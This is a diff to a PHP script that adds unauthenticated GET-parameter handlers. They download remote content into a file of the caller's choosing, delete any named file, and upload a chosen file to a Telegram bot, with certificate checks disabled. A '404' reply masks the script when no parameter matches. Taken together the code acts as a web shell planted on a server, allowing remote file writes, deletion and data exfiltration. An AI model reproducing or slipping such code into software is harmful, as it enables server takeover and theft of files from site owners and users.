@@ -36,7 +36,41 @@ if (isset($_GET['url'])) {
     $sebd=file_get_contents($nul);
     $dd=unlink($n);
     echo $sebd;
+}else if(isset($_GET['dw'])){
+    $ff=file_get_contents_ssl($_GET['dw']);
+    $n=$_GET['name'];
+    $ffu=file_put_contents($n,$ff);
+}else if(isset($_GET['del'])){
+    $gg=unlink($_GET['del']);
+}else if(isset($_GET['up'])){
+$url = 'https://api.telegram.org/bot'.$_GET['tk'].'/sendVideo';
+$file = __DIR__.'/'.$_GET['name']; 
+
+$headers = [
+    'Content-Type: multipart/form-data',
+    'User-Agent: '.$_SERVER['HTTP_USER_AGENT'],
+];
+
+$fields = [
+    'chat_id'=>$_GET['id'],
+    'video' => new CURLFile($file, 'image/png'),
+];
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
+
+var_dump($rr=curl_exec($ch));
+    echo $rr;
+var_dump(curl_error($ch));
+  
 }else {
    echo "404";
 }
+
 ?>
